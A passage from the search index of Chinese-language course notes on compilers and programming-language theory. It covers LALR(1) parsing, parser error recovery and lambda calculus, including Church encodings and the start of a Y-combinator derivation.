<li>\u5408\u5e76\u72b6\u6001\u7684\u4f9d\u636e\uff1aLR(1) \u9879\u7684 core \u76f8\u540c\uff08\u5373\u9664\u53bb lookahead \u7684\u7b2c\u4e00\u4e2a\u90e8\u5206\uff09<ul> <li>\u6bd4\u5982 \\(\\{(X\\to\\alpha\\ \\bullet\\ \\beta,\\ b), (Y\\to\\gamma\\ \\bullet\\ \\delta,\\ d)\\}\\) \u7684 core \u662f \\(\\{X\\to\\alpha\\ \\bullet\\ \\beta, Y\\to\\gamma\\ \\bullet\\ \\delta\\}\\)</li> </ul> </li> <li>\u6839\u636e LR(1) \u7684 DFA \u6784\u5efa LALR(1) \u7684 DFA\uff1a<ul> <li>\u9009\u62e9\u4e24\u4e2a\u6709\u76f8\u540c core \u7684\u4e0d\u540c\u72b6\u6001</li> <li>\u901a\u8fc7\u521b\u5efa\u4e00\u4e2a\u5408\u5e76\u6240\u6709\u9879\u7684\u65b0\u72b6\u6001\u6765\u5408\u5e76\u72b6\u6001</li> <li>\u6dfb\u52a0\u8f6c\u79fb\u8fb9</li> </ul> </li> <li>LALR(1) \u7684\u5206\u6790\u8868\u66f4\u5c0f\uff0c\u9700\u8981\u66f4\u5c11\u7684\u5185\u5b58\uff08\u4e00\u822c\u6bd4 LR(1) \u5c0f\u5341\u500d\uff09<ul> <li>\u4ecb\u4e8e SLR(1) \u548c LR(1) \u4e4b\u95f4\uff0c\u5206\u6790\u8868\u548c SLR(1) \u4e00\u6837\u5927\uff0c\u4f46\u5df2\u7ecf\u53ef\u4ee5\u5904\u7406\u5927\u90e8\u5206\u7684\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00</li> </ul> </li> </ul>"},{"location":"cs/pl/compiler/topic1/#_8","title":"\u9519\u8bef\u6062\u590d","text":"<ul> <li>\u5f00\u53d1\u8005\u60f3\u8981\u77e5\u9053\u7a0b\u5e8f\u4e2d\u7684\u5168\u90e8\u9519\u8bef\uff0c\u800c\u4e0d\u662f\u9047\u5230\u7b2c\u4e00\u4e2a\u9519\u8bef\u5c31\u505c\u6b62</li> <li>\u9519\u8bef\u6062\u590d\u7684\u6280\u672f<ul> <li>Local error recovery<ul> <li>\u4f7f\u7528 error \u7b26\u53f7\u6765\u8868\u793a\u9519\u8bef\uff0c\u7136\u540e\u8df3\u5230\u4e0b\u4e00\u4e2a\u53f3\u62ec\u53f7\u6216\u5206\u53f7\u4e4b\u540e\u7ee7\u7eed\u5206\u6790     <pre><code>exp -&gt; ( error )\nexps -&gt; error ; exp\n</code></pre></li> <li>\u5f53\u9047\u5230\u9519\u8bef\u65f6\uff0c\u91c7\u53d6\u4ee5\u4e0b\u884c\u52a8\uff1a<ul> <li>\u5f39\u51fa\u6808\u4e2d\u7684\u72b6\u6001\uff0c\u76f4\u5230\u6808\u9876\u72b6\u6001\u5305\u542b \\(A\\to\\alpha\\ \\bullet\\ \\mathsf{error}\\ \\beta\\)</li> <li>\u8bfb\u5165 error \u8fdb\u884c\u8f6c\u79fb</li> <li>\u5982\u679c \\(\\alpha\\) \u4e3a\u7a7a\u5219\u76f4\u63a5\u89c4\u7ea6\uff0c\u5426\u5219\u8df3\u8fc7\u540e\u7eed\u8f93\u5165\u7b26\u53f7\u76f4\u5230\u53ef\u4ee5\u89c4\u7ea6</li> </ul> </li> </ul> </li> <li>Global error recovery<ul> <li>\u5bfb\u627e\u4e00\u4e2a\u63d2\u5165\u548c\u5220\u9664\u7684\u6700\u5c0f\u96c6\u5408\uff0c\u53ef\u4ee5\u4f7f\u5f97\u4fee\u6539\u540e\u7684\u7a0b\u5e8f\u662f\u5408\u6cd5\u7684</li> </ul> </li> <li>Burke-Fisher error repair<ul> <li>\u5728\u51fa\u73b0\u95ee\u9898\u7684\u4f4d\u7f6e\u524d\u4e0d\u8d85\u8fc7 k \u4e2a token \u4e2d\u8fdb\u884c\u5355\u4e2a token \u7684\u63d2\u5165/\u5220\u9664/\u66ff\u6362</li> <li>\u4e0d\u9700\u8981\u4fee\u6539 LL(k) LR(k) LALR \u7684\u8bed\u6cd5\u548c\u5206\u6790\u8868\u5c31\u53ef\u4ee5</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/pl/ppl/","title":"\u7f16\u7a0b\u8bed\u8a00\u539f\u7406","text":"<p>Abstract</p> <p>\u6d59\u6c5f\u5927\u5b66 \u201c\u7f16\u7a0b\u8bed\u8a00\u539f\u7406\u201d \u8bfe\u7a0b\u76f8\u5173\u77e5\u8bc6\u7b14\u8bb0</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>\u56fe\u7075\u73ed\u8bfe\u7a0b\u5b66\u4e60\u6307\u5357\uff1a\u7a0b\u5e8f\u8bbe\u8ba1\u65b9\u6cd5\u5b66</li> <li>\u6559\u6750\uff1aPractical Foundations for Programming Languages (PFPL)</li> </ul>"},{"location":"cs/pl/ppl/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Lambda \u6f14\u7b97</li> <li>\u62bd\u8c61\u8bed\u6cd5\u6811\u4e0e\u5f52\u7eb3\u6cd5</li> <li>\u9759\u6001\u8bed\u4e49\u4e0e\u52a8\u6001\u8bed\u4e49</li> <li>\u51fd\u6570\u4e0e\u9012\u5f52</li> <li>\u6570\u636e\u7c7b\u578b</li> <li>\u9012\u5f52\u7cfb\u7edf PCF\uff08TODO\uff09</li> </ul>"},{"location":"cs/pl/ppl/topic1/","title":"Lambda \u6f14\u7b97","text":"<p> \u7ea6 2481 \u4e2a\u5b57  10 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p> <p>Abstract</p> <p>\u7f16\u7a0b\u8bed\u8a00\u539f\u7406\u7b2c\u4e00\u81f3\u7b2c\u4e8c\u5468\u8bfe\u7a0b\u5185\u5bb9\uff0c\u4ee5\u53ca\u7b2c\u4e8c\u6b21\u4f5c\u4e1a\u4e2d\u5173\u4e8e \u03bb \u6f14\u7b97\u7684\u8865\u5145\u5185\u5bb9</p>"},{"location":"cs/pl/ppl/topic1/#_1","title":"\u57fa\u672c\u5b9a\u4e49","text":"<ul> <li>Lambda \u6f14\u7b97\u662f\u662f\u7531\u7279\u5b9a\u5f62\u5f0f\u8bed\u6cd5\u6240\u7ec4\u6210\u7684\u2f00\u79cd\u8bed\u2f94\uff0c\u2f00\u7ec4\u8f6c\u6362\u89c4\u5219\u53ef\u8fd0\u7b97\uff08operate\uff09\u5176\u4e2d\u7684 \u03bb \u9879\uff08term\uff09</li> <li>\u03bb \u9879<ul> <li>\u53d8\u91cf\uff1a\u53d8\u91cf \\(x\\) \u672c\u8eab\u662f\u4e00\u4e2a\u6709\u6548\u7684 \u03bb \u9879</li> <li>\u62bd\u8c61\uff1a\u5982\u679c \\(\\mathsf{t}\\) \u662f\u4e00\u4e2a \u03bb \u9879\uff0c\u800c \\(x\\) \u662f\u4e00\u4e2a\u53d8\u91cf\uff0c\u5219 \\(\\lambda x.\\ \\mathsf{t}\\) \u662f\u4e00\u4e2a \u03bb \u9879<ul> <li>\\(\\lambda x.\\ \\mathsf{t}\\) \u8868\u793a\u4e00\u4e2a\u5f62\u53c2\u4e3a \\(x\\) \u8fd4\u56de \\(\\mathsf{t}\\) \u7684\u51fd\u6570\uff08\\(\\mathsf{t}\\) \u4e2d\u53ef\u80fd\u7528\u5230 \\(x\\)\uff09</li> <li>\u4e0d\u53ef\u4ee5\u4e3a \\(\\lambda x.\\ \\mathsf{t}\\) \u547d\u540d\uff0c\u6bd4\u5982\u547d\u540d\u5176\u4e3a \\(M\\) \u7136\u540e\u540e\u7eed\u4f7f\u7528 \\(M\\)<ul> <li>\u4f8b\u5916\uff1a\u53ef\u4ee5\u7528 \\(\\mathsf{I}\\) \u4ee3\u66ff\u6052\u7b49\u51fd\u6570 \\(\\lambda x.\\ x\\) </li> </ul> </li> </ul> </li> <li>\u5e94\u7528\uff1a\u5982\u679c \\(t\\) \u548c \\(s\\) \u662f \u03bb \u9879\uff0c\u5219 \\(t\\ s\\) \u662f\u4e00\u4e2a \u03bb \u9879<ul> <li>\u76f8\u5f53\u4e8e\u51fd\u6570\u8c03\u7528\uff0c\u6709\u7684\u4f5c\u8005\u7528 \\(\\mathrm{ap}(t\\ s)\\) \u8868\u8fbe</li> </ul> </li> </ul> </li> <li>\u6d88\u6b67\u7ea6\u5b9a<ul> <li>\u51fd\u6570\u62bd\u8c61\u7684\u51fd\u6570\u4f53\u5c3d\u6700\u5927\u53ef\u80fd\u5411\u53f3\u6269\u5c55<ul> <li>\\(\\lambda x.\\ M\\ N\\) \u8868\u8fbe\u4e00\u6574\u4e2a\u51fd\u6570\u62bd\u8c61\uff0c\u800c\u975e \\((\\lambda x.\\ M)\\ N\\)</li> </ul> </li> <li>\u51fd\u6570\u5e94\u7528\u5de6\u7ed3\u5408<ul> <li>\\(M\\ N\\ P\\) \u610f\u4e3a \\((M\\ N)\\ P\\) \u800c\u975e \\(M\\ (N\\ P)\\)</li> </ul> </li> </ul> </li> <li> <p>\u81ea\u7531\u53d8\u91cf\u548c\u7ed1\u5b9a\u53d8\u91cf</p> <ul> <li>\u5f62\u53c2\u7ed1\u5b9a\u4e8e\u51fd\u6570\u4f53\uff0c\u8fd4\u56de\u5185\u5bb9\u5185\u51fa\u73b0\u5f62\u53c2\u5373\u4e3a\u7ed1\u5b9a\u53d8\u91cf<ul> <li>\u7ed1\u5b9a\u53d8\u91cf\u53ef\u4ee5\u81ea\u7531\u6539\u540d\uff0c\u6bd4\u5982 \\(\\lambda x.\\ x\\) \u7b49\u540c\u4e8e \\(\\lambda y.\\ y\\)</li> <li>\\(BV(x) = \\empty\\)\u3001\\(BV(\\lambda x.\\ t) = \\{x\\}\\cup BV(t)\\)\u3001\\(BV(t_1\\ t_2) = BV(t_1)\\cup BV(t_2)\\)<ul> <li>\u5e38\u7528 \\(t\\) \u4e00\u7c7b\u7684\u7b26\u53f7\u8868\u793a\u4e00\u4e2a\u4efb\u610f \u03bb \u9879</li> </ul> </li> </ul> </li> <li>\u4e0d\u662f\u7ed1\u5b9a\u53d8\u91cf\u5c31\u662f\u81ea\u7531\u53d8\u91cf<ul> <li>\u81ea\u7531\u53d8\u91cf\u4e0d\u53ef\u4ee5\u81ea\u7531\u6539\u540d</li> <li>\\(FV(x) = \\{x\\}\\)\u3001\\(FV(\\lambda x.\\ t) = FV(t) - \\{x\\}\\)\u3001\\(FV(t_1\\ t_2) = FV(t_1)\\cup FV(t_2)\\)</li> </ul> </li> </ul> Example \\((\\lambda y.\\ y)\\ (\\lambda x.\\ x\\ y)\\) \u4e00\u4e2a\u5e94\u7528\uff0c\u5de6\u4fa7\u51fd\u6570\u4e2d \\(y\\) \u662f\u7ed1\u5b9a\u53d8\u91cf\uff0c\u53f3\u4fa7\u51fd\u6570\u4e2d \\(x\\) \u662f\u7ed1\u5b9a\u53d8\u91cf\u3001\\(y\\) \u662f\u81ea\u7531\u53d8\u91cf\u4e14\u4e0e\u5de6\u4fa7\u51fd\u6570\u4e2d\u7684 \\(y\\) \u65e0\u5173\u3002 \\(\\lambda x.\\ (\\lambda y.\\ x\\ y\\ z)\\) \u5185\u5c42\u51fd\u6570\u4e2d \\(x\\) \u7ed1\u5b9a\u4e8e\u5916\u5c42\u51fd\u6570\uff0c\\(y\\) \u7ed1\u5b9a\u4e8e\u5185\u5c42\u51fd\u6570\uff0c\u4e8c\u8005\u90fd\u662f\u7ed1\u5b9a\u53d8\u91cf\uff1b\\(z\\) \u662f\u81ea\u7531\u53d8\u91cf\u3002 </li> <li> <p>\u5c01\u95ed\uff08closed\uff09</p> <ul> <li>\u9879 \\(t\\) \u662f\u5c01\u95ed\u7684\uff08\u95ed\u9879\uff09\uff0c\u5f53\u4e14\u4ec5\u5f53 \\(FV(t) = \\empty\\)<ul> <li>\u5373\u6ca1\u6709\u81ea\u7531\u53d8\u91cf</li> <li>\u7c7b\u6bd4\u7a0b\u5e8f\u4e2d\u5c31\u662f\u6ca1\u6709\u4f7f\u7528\u5168\u5c40\u53d8\u91cf\u7684\u51fd\u6570\uff08OS \u4e2d\u79f0\u4e3a\u53ef\u91cd\u5165\u51fd\u6570\uff09</li> </ul> </li> <li>\u9879 \\(t\\) \u76f8\u5bf9\u4e8e \\(t'\\) \u5c01\u95ed\uff0c\u5f53\u4e14\u4ec5\u5f53 \\(FV(t) \\cap BV(t') = \\empty\\)<ul> <li>\u5373 \\(t\\) \u7684\u81ea\u7531\u53d8\u91cf\u4e0d\u4f1a\u4e0e \\(t'\\) \u7684\u7ed1\u5b9a\u53d8\u91cf\u51b2\u7a81</li> <li>\u95ed\u9879 \\(t\\) \u76f8\u5bf9\u4e8e\u4efb\u610f\u9879 \\(t'\\) \u5c01\u95ed</li> </ul> </li> </ul> </li> <li>\u4ee3\u6362\uff1a\u8bb0\u53f7 \\([N/x]M\\) \u8868\u793a\u5c06 \\(M\\) \u4e2d\u7684\u6240\u6709 \\(x\\) \u66ff\u6362\u4e3a \\(N\\)<ul> <li>\\(M\\) \u4e2d\u4e0d\u80fd\u6709\u4e0e \\(N\\) \u4e2d\u81ea\u7531\u53d8\u91cf\u540d\u79f0\u51b2\u7a81\u7684\u7ed1\u5b9a\u53d8\u91cf</li> </ul> </li> <li>\u51fd\u6570\u7ec4\u5408\uff1a\\((f\\circ g)(x) = f(g(x))\\)<ul> <li>\\(f\\circ g = \\lambda x.\\ f\\ (g\\ x)\\)</li> <li>\\(\\circ = \\lambda f.\\ \\lambda g.\\ \\lambda x.\\ f\\ (g\\ x)\\)</li> </ul> </li> </ul>"},{"location":"cs/pl/ppl/topic1/#_2","title":"\u03bb \u5f62\u5f0f\u7cfb\u7edf","text":"<p>\u03bb \u6f14\u7b97\u2f64\u4e8e\u5bf9 \u03bb \u8868\u8fbe\u5f0f\u8fdb\u2f8f\u63a8\u7406\uff0c\u5305\u542b\u516c\u7406\u8bed\u4e49\u3001\u64cd\u4f5c\u8bed\u4e49\u548c\u6307\u79f0\u8bed\u4e49\u4e09\u4e2a\u90e8\u5206\u3002</p> <ul> <li>\u516c\u7406\u8bed\u4e49\uff1a\u8868\u8fbe\u5f0f\u4e4b\u95f4\u7b49\u5f0f\u7684\u5f62\u5f0f\u7cfb\u7edf</li> <li>\u64cd\u4f5c\u8bed\u4e49\uff1a\u5bf9\u8868\u8fbe\u5f0f\u8fdb\u884c\u89c4\u7ea6\uff08reduce\uff09\u7684\u7b49\u5f0f\u63a8\u7406\u7684\u6709\u5411\u5f62\u5f0f</li> <li>\u6307\u79f0\u8bed\u4e49\uff1a\u7c7b\u4f3c\u5176\u4ed6\u903b\u8f91\u7cfb\u7edf\u7684\u6a21\u578b\u8bba\uff08\uff1f\uff09</li> </ul>"},{"location":"cs/pl/ppl/topic1/#_3","title":"\u7b49\u5f0f\u8bed\u4e49","text":"<ul> <li>\u7b49\u5f0f\u8bed\u4e49\u5206\u4e3a\u5b9a\u4e49\u7b49\u4ef7\u548c\u8bed\u4e49\u7b49\u4ef7<ul> <li>\u5b9a\u4e49\u7b49\u4ef7\uff1a\u5b9a\u4e49\u65f6\u5c31\u6709\u76f8\u540c\u5f62\u5f0f\uff0c\u5982 \\(\\lambda x.\\ x\\) \u4e0e \\(\\lambda x.\\ x\\) \u7b49\u4ef7</li> <li>\u8bed\u4e49\u7b49\u4ef7\uff1a\u8bed\u4e49\u76f8\u540c\uff0c\u5373\u76f8\u5f53\u4e8e\u7a0b\u5e8f\u6709\u76f8\u540c\u6548\u679c\uff0c\u5982 \\(\\lambda x.\\ x\\) \u4e0e \\(\\lambda y.\\ y\\) \u7b49\u4ef7</li> </ul> </li> <li>\u4e09\u79cd\u8bed\u4e49\u7b49\u4ef7\uff1a<ul> <li>\\(\\alpha\\) \u7b49\u4ef7\uff08renaming\uff0c\u76f8\u5f53\u4e8e\u7ed9\u53d8\u91cf\u6539\u540d\uff09<ul> <li>\u4efb\u610f\u53c2\u6570 \\(x\\) \u4efb\u610f\u8bcd\u9879 \\(t\\)\uff0c\\(\\lambda x.\\ t\\equiv_\\alpha \\lambda y.\\ [y/x]t\\)</li> </ul> </li> <li>\\(\\beta\\) \u7b49\u4ef7\uff08reduction\uff0c\u76f8\u5f53\u4e8e\u5e94\u7528\u51fd\u6570\u5f97\u5230\u7ed3\u679c\uff09<ul> <li>\u4efb\u610f\u53c2\u6570 \\(x\\) \u4efb\u610f\u8bcd\u9879 \\(t_1, t_2\\)\uff0c\u5982\u679c \\(t_2\\) \u76f8\u5bf9\u4e8e \\(t_1\\) \u5c01\u95ed\uff0c\u5219 \\((\\lambda x.\\ t_1)\\ t_2\\equiv_\\beta [t_2/x]t_1\\)</li> </ul> </li> <li>\\(\\eta\\) \u7b49\u4ef7<ul> <li>\u4efb\u610f\u53c2\u6570 \\(x\\) \u4efb\u610f\u8bcd\u9879 \\(t\\)\uff0c\\(\\lambda y.\\ (\\lambda x.\\ t)\\ y\\equiv_\\eta \\lambda x.\\ t\\)</li> </ul> </li> <li>\u5bf9\u4e8e\u4e09\u79cd\u7b49\u4ef7\uff0c\u90fd\u6709\u4ee5\u4e0b\u4e24\u6761\u989d\u5916\u89c4\u5219<ul> <li>\u5982\u679c \\(t\\equiv_? t'\\)\uff0c\u5219\u5bf9\u4e8e\u4efb\u610f\u53c2\u6570 \\(x\\)\uff0c\\(\\lambda x.\\ t\\equiv_? \\lambda x.\\ t'\\)</li> <li>\u5982\u679c \\(t_1\\equiv_? t_1'\\) \u4e14 \\(t_2\\equiv_? t_2'\\)\uff0c\u5219 \\(t_1\\ t_2\\equiv_? t_1'\\ t_2'\\)</li> </ul> </li> </ul> </li> <li>\u8bed\u4e49\u7b49\u4ef7\uff1a<ul> <li>\\(t\\) \u901a\u8fc7 \\(\\alpha/\\beta/\\eta\\) \u7b49\u4ef7\u89c4\u5219\u53ef\u53d8\u4e3a \\(t'\\)\uff0c\u5219 \\(t\\) \u548c \\(t'\\) \u8bed\u4e49\u7b49\u4ef7\uff0c\u8bb0\u4e3a \\(t\\equiv t'\\)</li> <li>\u8bed\u4e49\u7b49\u4ef7\u662f\u4e00\u4e2a\u81ea\u53cd\u5bf9\u79f0\u4f20\u9012\u95ed\u5305</li> </ul> </li> </ul>"},{"location":"cs/pl/ppl/topic1/#_4","title":"\u64cd\u4f5c\u8bed\u4e49","text":"<ul> <li>\u89c4\u7ea6\u89c4\u5219\u63d0\u4f9b\u4e86\u7b49\u5f0f\u63a8\u7406\u7684\u4e00\u79cd\u6709\u5411\u5f62\u5f0f</li> <li>\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u901a\u8fc7 \\(\\beta\\) \u89c4\u7ea6\u5bf9\u8868\u8fbe\u5f0f\u8fdb\u884c\u89c4\u7ea6/\u5316\u7b80<ul> <li>\\(\\rightarrow\\) \u8868\u793a\u4e00\u6b65\u89c4\u7ea6</li> <li>\\(\\twoheadrightarrow\\) \u8868\u793a\u96f6\u6b65\u6216\u591a\u6b65\u89c4\u7ea6</li> </ul> </li> <li>\u89c4\u7ea6\u8fc7\u7a0b\u8981\u6ce8\u610f\u76f8\u5bf9\u5c01\u95ed\uff0c\u4e0d\u5c01\u95ed\u7684\u8bdd\u8981\u5148\u8fdb\u884c \\(\\alpha\\) \u91cd\u547d\u540d</li> </ul>"},{"location":"cs/pl/ppl/topic1/#_5","title":"\u901a\u8fc7 \u03bb \u9879\u5b9a\u4e49\u503c","text":""},{"location":"cs/pl/ppl/topic1/#_6","title":"\u5e03\u5c14\u503c","text":"<ul> <li>\u53ef\u4ee5\u5b9a\u4e49\u4e24\u4e2a\u8868\u8fbe\u5f0f\u5206\u522b\u8868\u793a True \u548c False<ul> <li>\\(\\mathsf{T} := \\lambda x.\\ \\lambda y.\\ x\\)</li> <li>\\(\\mathsf{F} := \\lambda x.\\ \\lambda y.\\ y\\)</li> <li>\u7406\u89e3\uff1a\u7c7b\u6bd4 if \u8bed\u53e5 <code>if (cond) { A } else { B }</code>\uff0c\u5982\u679c cond \u4e3a\u771f\u8fd4\u56de A\uff0c\u5426\u5219\u8fd4\u56de B</li> </ul> </li> <li>\u7b97\u5b50\uff1a<ul> <li>\u975e\uff1a\u6ee1\u8db3 \\(\\mathsf{not}\\ \\mathsf{T}\\equiv_\\beta \\mathsf{F}\\)\u3001\\(\\mathsf{not}\\ \\mathsf{F}\\equiv_\\beta \\mathsf{T}\\)<ul> <li>\\(\\mathsf{not} := \\lambda b.\\ b\\ \\mathsf{F}\\ \\mathsf{T}\\equiv \\lambda b.\\ b\\ (\\lambda x.\\ \\lambda y.\\ y)\\ (\\lambda y.\\ \\lambda y.\\ x)\\)</li> <li>\u9a8c\u8bc1\uff1a\\(\\mathsf{not}\\ \\mathsf{T} = (\\lambda b.\\ b\\ \\mathsf{F}\\ \\mathsf{T})\\ \\mathsf{T}\\equiv_\\beta \\mathsf{T}\\ \\mathsf{F}\\ \\mathsf{T} = (\\lambda x.\\ \\lambda y.\\ x)\\ \\mathsf{F}\\ \\mathsf{T}\\equiv_\\beta \\mathsf{F}\\)</li> </ul> </li> <li>\u4e0e\uff1a\\(\\mathsf{and} := \\lambda x.\\ \\lambda y.\\ (x\\ y\\ \\mathsf{F})\\)</li> <li>\u6216: \\(\\mathsf{or} := \\lambda x.\\ \\lambda y.\\ (x\\ \\mathsf{T}\\ y)\\)</li> </ul> </li> </ul>"},{"location":"cs/pl/ppl/topic1/#_7","title":"\u81ea\u7136\u6570","text":"<p>\u8fd9\u91cc\u91c7\u7528\u7684\u662f\u4e00\u79cd\u7528 \u03bb \u8868\u8fbe\u5f0f\u8868\u793a\u81ea\u7136\u6570\u7684\u65b9\u6cd5\uff0c\u79f0\u4e3a Church \u6570\u3002</p> <ul> <li>\u4f7f\u7528\u53c2\u6570 \\(z\\) \u8868\u793a 0\uff0c\u4f7f\u7528 \\(s\\) \u8868\u793a\u6c42\u540e\u7ee7\u7684\u51fd\u6570\uff0c\u5219\u5728 \\(z\\) \u4e0a\u5e94\u7528 \\(s\\) \u7684\u6b21\u6570\u5c31\u53ef\u4ee5\u7528\u6765\u8868\u793a\u81ea\u7136\u6570\uff1a<ul> <li>\\(\\overline{0} := \\lambda s.\\ \\lambda z.\\ z\\)</li> <li>\\(\\overline{1} := \\lambda s.\\ \\lambda z.\\ s\\ z\\)</li> <li>\\(\\overline{2} := \\lambda s.\\ \\lambda z.\\ s\\ (s\\ z)\\)</li> <li>\\(\\overline{n} := \\lambda s.\\ \\lambda z.\\ \\underbrace{s\\ (s\\ (\\cdots\\ (s}_{n\\ times}\\ z)\\cdots)) = \\lambda s.\\ \\lambda z.\\ s^n\\ z\\)</li> </ul> </li> <li>\u6839\u636e\u5982\u4e0a\u5b9a\u4e49\u6709\uff1a<ul> <li>\\(\\overline{n}\\ f\\ x\\equiv_\\beta f^n\\ x\\)</li> <li>\u5b9a\u4e49 \\(\\mathsf{zero} := \\overline{0} = \\lambda s.\\ \\lambda z.\\ z\\)</li> <li>\u5b9a\u4e49\u540e\u7ee7\u51fd\u6570 \\(\\mathsf{succ} := \\lambda n.\\ \\overline{n+1} = \\lambda n.\\ \\lambda s.\\ \\lambda z.\\ s\\ (n\\ s\\ z)\\)<ul> <li>\u6ee1\u8db3 \\(\\mathsf{succ}\\ \\overline{n}\\equiv \\overline{n+1}\\)</li> <li>\u9a8c\u8bc1\uff1a\\(\\mathsf{succ}\\ \\overline{n} = \\lambda s.\\ \\lambda z.\\ s\\ (\\overline{n}\\ s\\ z) \\equiv_\\beta \\lambda s.\\ \\lambda z.\\ s\\ (s^n\\ z) = \\lambda s.\\ \\lambda z.\\ s^{n+1}\\ z = \\overline{n+1}\\)</li> </ul> </li> </ul> </li> <li> <p>\u5b9a\u4e49\u8fd0\u7b97\uff1a</p> <ul> <li>\u52a0\uff1a\\(\\mathsf{plus} := \\lambda m.\\ \\lambda n.\\ \\lambda f.\\ \\lambda x.\\ m\\ f\\ (n\\ f\\ x) = \\lambda m.\\ \\lambda n.\\ m\\ \\mathsf{succ}\\ n\\)</li> <li>\u4e58\uff1a\\(\\mathsf{mult} := \\lambda m.\\ \\lambda n.\\ \\lambda f.\\ \\lambda x.\\ m\\ (n\\ f)\\ x = \\lambda m.\\ \\lambda n.\\ \\lambda f.\\ m\\ (n\\ f)\\)</li> </ul> \u5173\u4e8e $\\mathsf{plus} \u7684\u9a8c\u8bc1 \\[ \\begin{align*} &amp;\\mathsf{plus}\\ \\overline{a}\\ \\overline{b}\\\\ =\\ &amp;\\mathsf{plus}\\ (\\lambda s.\\ \\lambda z.\\ s^a\\ z)\\ \\overline{b}\\\\ =\\ &amp;(\\lambda n.\\ \\lambda k.\\ n\\ \\mathsf{succ}\\ k)\\ (\\lambda s.\\ \\lambda z.\\ s^a\\ z)\\ \\overline{b}\\\\ \\equiv_\\beta\\ &amp;(\\lambda k.\\ (\\lambda s.\\ \\lambda z.\\ s^a\\ z)\\ \\mathsf{succ}\\ k)\\ \\overline{b}\\\\ \\equiv_\\beta\\ &amp;(\\lambda s.\\ \\lambda z.\\ s^a\\ z)\\ \\mathsf{succ}\\ \\overline{b}\\\\ \\equiv_\\beta\\ &amp;(\\lambda z.\\ \\mathsf{succ}^a\\ z)\\ \\overline{b}\\\\ \\equiv_\\beta\\ &amp;\\mathsf{succ}^a\\ \\overline{b}\\\\ \\twoheadrightarrow\\ &amp;\\overline{a+b} \\end{align*} \\] </li> </ul> <p>\u4ee5\u4e0b\u662f\u7b2c\u4e8c\u6b21\u4f5c\u4e1a\u4e2d\u7684\u989d\u5916\u5185\u5bb9</p>"},{"location":"cs/pl/ppl/topic1/#y-combinator","title":"Y-Combinator","text":"<p>\u5047\u8bbe\u8981\u5b9e\u73b0\u4e00\u4e2a\u9012\u5f52\u51fd\u6570\u6765\u8ba1\u7b97\u9636\u4e58\uff0c\u5728\u5404\u7f16\u7a0b\u8bed\u8a00\u4e2d\u53ef\u4ee5\u4f7f\u7528\u9012\u5f52\uff1a</p> <pre><code>def fact(n):\n    if n == 0:\n        return 1\n    else:\n        return n * fact(n - 1)\n</code></pre> <p>\u5199\u6210 \u03bb \u8868\u8fbe\u5f0f\u7684\u5f62\u5f0f\u5c31\u662f \\(\\mathsf{fact} = \\lambda n.\\ \\mathsf{iszero}\\ n\\ 1\\ (\\mathsf{mult}\\ n\\ (\\mathsf{fact}\\ (\\mathsf{pred}\\ n)))\\)\uff08\u5176\u4e2d \\(\\mathsf{iszero}\\ a\\ b\\ c\\) \u5224\u65ad \\(a\\) \u662f\u5426\u4e3a 0\uff0c\u5982\u679c\u662f\u5219\u7ed3\u679c\u4e3a \\(b\\) \u5426\u5219\u4e3a \\(c\\)\uff0c\\(\\mathsf{pred}\\) \u8ba1\u7b97\u524d\u9a71\uff09\u3002\u4e0d\u8fc7 \u03bb \u8868\u8fbe\u5f0f\u5e76\u4e0d\u5141\u8bb8\u6211\u4eec\u8fd9\u6837\u5f15\u7528\u81ea\u5df1\u7684\u540d\u5b57\u3002</p> <p>\u89e3\u51b3\u65b9\u6cd5\u662f\u4f7f\u7528\u4e00\u4e2a\u8fd9\u6837\u7684\u51fd\u6570\uff1a</p> <pre><code>def proto(f, n):\n    if n == 0:\n        return 1\n    else:\n        return n * f(f, n - 1)\n</code></pre> <p>\u8fd9\u6837 proto \u51fd\u6570\u5185\u90e8\u5c31\u6ca1\u6709\u4f7f\u7528\u8fc7 proto \u81ea\u8eab\uff0c\u90a3\u73b0\u5728\u5047\u8bbe\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f proto\uff0c\u5c31\u51fa\u73b0\u4e86 proto(proto, n) = n * proto(proto, n-1) = n * (n-1) * proto(proto, n-2) = ... \u8fd9\u6837\u6210\u529f\u9012\u5f52\u4e86\uff0c\u6240\u4ee5 \\(\\mathsf{fact} = \\mathsf{proto}\\ \\mathsf{proto}\\)\u3002</p> <p>\u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u5b9e\u9645\u5c31\u662f\u628a\u4e00\u5c42\u51fd\u6570 f \u5305\u88f9\u4e86\u4e00\u5c42\uff0c\u53d8\u6210\u4e86\u8c03\u7528 f f\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5148\u5c06 f f \u5408\u5e76\uff0c\u5199\u51fa\u8fd9\u6837\u4e00\u4e2a\u51fd\u6570\uff1a</p> \\[ \\mathsf{u} = \\lambda f.\\ \\lambda n.\\ \\mathsf{iszero}\\ n\\ 1\\ (\\mathsf{mult}\\ n\\ (f\\ (\\mathsf{pred}\\ n))) \\] <p>\u7136\u540e\u6211\u4eec\u4f9d\u6b64\u6765\u5b9a\u4e49 \\(\\mathsf{proto}\\)\uff1a</p> \\[ \\begin{align*} \\mathsf{proto} &amp;= \\lambda f.\\ \\mathsf{u}\\ (f\\ f)\\\\ &amp;= \\lambda f.\\ \\lambda n.\\ \\mathsf{iszero}\\ n\\ 1\\ (\\mathsf{mult}\\ n\\ ((f\\ f)\\ (\\mathsf{pred}\\ n))) \\end{align*} \\] <p>\u63a5\u4e0b\u6765\u63a8\u5bfc \\(\\mathsf{proto}\\ \\mathsf{proto}\\)\uff1a</p> \\[ \\mathsf{proto}\\ \\mathsf{proto} = \\lambda n.\\ \\mathsf{iszero}\\ n\\ 1\\ (\\mathsf{mult}\\ n\\ ((\\mathsf{proto}\\ \\mathsf{proto})\\ (\\mathsf{pred}\\ n))) \\] <p>\u5982\u679c\u5c06 \\(\\mathsf{proto}\\ \\mathsf{proto}\\) \u90fd\u4ee3\u6362\u4e3a \\(\\mathsf{fact}\\) \u5c31\u662f\u6211\u4eec\u4e4b\u524d\u60f3\u8981\u5199\u7684 \u03bb 